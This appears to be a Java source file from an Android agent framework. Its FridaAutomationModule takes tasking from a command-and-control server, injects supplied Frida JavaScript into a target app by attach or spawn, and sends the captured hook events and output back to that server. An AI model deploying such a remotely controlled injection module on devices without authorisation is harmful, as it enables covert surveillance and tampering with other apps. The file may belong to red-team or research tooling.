package com.mobilemorph.agent.modules;

import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

/**
 * FridaAutomationModule - Runs Frida scripts against a target package.
 *
 * Accepts either raw script content or a script name (written to cache dir),
 * spawns or attaches Frida to the target process, captures all send() events
 * and console output, and returns structured JSON results to the C2.
 *
 * Args:
 *   target_package (required) - e.g. "com.example.app"
 *   script_content (optional) - raw JavaScript to inject
 *   script_name    (optional) - filename in cache dir (used if no script_content)
 *   mode           (optional) - "attach" (default) or "spawn"
 *   duration       (optional) - seconds to run before terminating (default: 30)
 *
 * Similar to: frida -U [-f|-n] <package> -l <script.js> --no-pause
 */
public class FridaAutomationModule {
    private static final String TAG = "FridaAutomationModule";
    private final Context context;

    public FridaAutomationModule(Context context) {
        this.context = context;
    }

    public JSONObject run(JSONObject args) {
        try {
            String targetPackage = args.getString("target_package");
            String scriptContent = args.optString("script_content", null);
            String scriptName    = args.optString("script_name", "frida_hook.js");
            String mode          = args.optString("mode", "attach");
            int    duration      = args.optInt("duration", 30);

            Log.i(TAG, "Frida run: target=" + targetPackage + " mode=" + mode
                    + " duration=" + duration + "s");

            // Write script to cache
            File scriptFile = prepareScript(scriptContent, scriptName);
            if (scriptFile == null) {
                return createResponse("error", null,
                        "Failed to prepare script file");
            }

            // Build Frida command
            List<String> cmd = buildFridaCommand(mode, targetPackage,
                    scriptFile.getAbsolutePath());

            Log.d(TAG, "Frida command: " + cmd.toString());

            // Execute with timeout
            return executeFrida(cmd, duration, targetPackage,
                    scriptFile.getName());

        } catch (Exception e) {
            Log.e(TAG, "FridaAutomationModule.run() failed", e);
            return createResponse("error", null,
                    "Frida run failed: " + e.getMessage());
        }
    }

    // ── Helpers ─────────────────────────────────────────────────────────────

    private File prepareScript(String scriptContent, String scriptName) {
        try {
            File scriptFile = new File(context.getCacheDir(), scriptName);
            if (scriptContent != null && !scriptContent.isEmpty()) {
                // Write provided content
                try (FileWriter fw = new FileWriter(scriptFile)) {
                    fw.write(scriptContent);
                }
                Log.d(TAG, "Script written to: " + scriptFile.getAbsolutePath());
            } else if (!scriptFile.exists()) {
                Log.w(TAG, "Script file not found in cache and no content provided: "
                        + scriptName);
                return null;
            }
            return scriptFile;
        } catch (Exception e) {
            Log.e(TAG, "Failed to prepare script", e);
            return null;
        }
    }

    private List<String> buildFridaCommand(String mode, String targetPackage,
                                           String scriptPath) {
        List<String> cmd = new ArrayList<>();
        cmd.add("frida");
        cmd.add("-U");

        if ("spawn".equalsIgnoreCase(mode)) {
            cmd.add("-f");
        } else {
            cmd.add("-n");
        }

        cmd.add(targetPackage);
        cmd.add("-l");
        cmd.add(scriptPath);
        cmd.add("--no-pause");

        return cmd;
    }

    private JSONObject executeFrida(List<String> cmd, int durationSeconds,
                                    String targetPackage, String scriptName) {
        final List<String> outputLines  = new ArrayList<>();
        final List<JSONObject> events   = new ArrayList<>();
        final long startMs              = System.currentTimeMillis();

        Process process = null;
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            process = pb.start();

            final Process proc = process;
            final BufferedReader reader = new BufferedReader(
                    new InputStreamReader(proc.getInputStream()));

            // Read output on a separate thread so we can apply the timeout
            ExecutorService executor = Executors.newSingleThreadExecutor();
            Future<?> readFuture = executor.submit(() -> {
                try {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        outputLines.add(line);
                        // Try to parse send() output as JSON event
                        tryParseEvent(line, events);
                        Log.d(TAG, "[Frida] " + line);
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Output reader interrupted: " + e.getMessage());
                }
            });

            // Wait for duration then kill
            readFuture.get(durationSeconds, TimeUnit.SECONDS);

        } catch (java.util.concurrent.TimeoutException e) {
            Log.i(TAG, "Frida session ended after " + durationSeconds + "s timeout");
        } catch (Exception e) {
            Log.e(TAG, "Frida execution error", e);
        } finally {
            if (process != null) {
                process.destroy();
            }
        }

        long elapsedMs = System.currentTimeMillis() - startMs;

        // Build result
        JSONObject data = new JSONObject();
        try {
            data.put("target_package", targetPackage);
            data.put("script", scriptName);
            data.put("duration_ms", elapsedMs);
            data.put("line_count", outputLines.size());
            data.put("event_count", events.size());

            JSONArray linesArray = new JSONArray();
            for (String l : outputLines) linesArray.put(l);
            data.put("output", linesArray);

            JSONArray eventsArray = new JSONArray();
            for (JSONObject ev : events) eventsArray.put(ev);
            data.put("events", eventsArray);

        } catch (Exception e) {
            Log.e(TAG, "Failed to build result", e);
        }

        return createResponse("success", data, null);
    }

    /**
     * Try to parse a Frida output line as a structured JSON event from send().
     * Frida wraps send() output as: {"type":"send","payload":<your_json>,...}
     * or the payload may appear directly as the line content.
     */
    private void tryParseEvent(String line, List<JSONObject> events) {
        try {
            // Frida send() output format: {"type":"send","payload":...}
            JSONObject wrapper = new JSONObject(line);
            if ("send".equals(wrapper.optString("type"))) {
                Object payload = wrapper.opt("payload");
                if (payload instanceof JSONObject) {
                    events.add((JSONObject) payload);
                } else if (payload instanceof String) {
                    // Payload is a JSON string
                    events.add(new JSONObject((String) payload));
                }
            }
        } catch (Exception ignored) {
            // Line is plain text console output, not a send() event — that's fine
        }
    }

    private JSONObject createResponse(String status, Object data, String error) {
        try {
            JSONObject response = new JSONObject();
            response.put("status", status);
            response.put("data", data);
            response.put("error", error);
            return response;
        } catch (Exception e) {
            return new JSONObject();
        }
    }
}
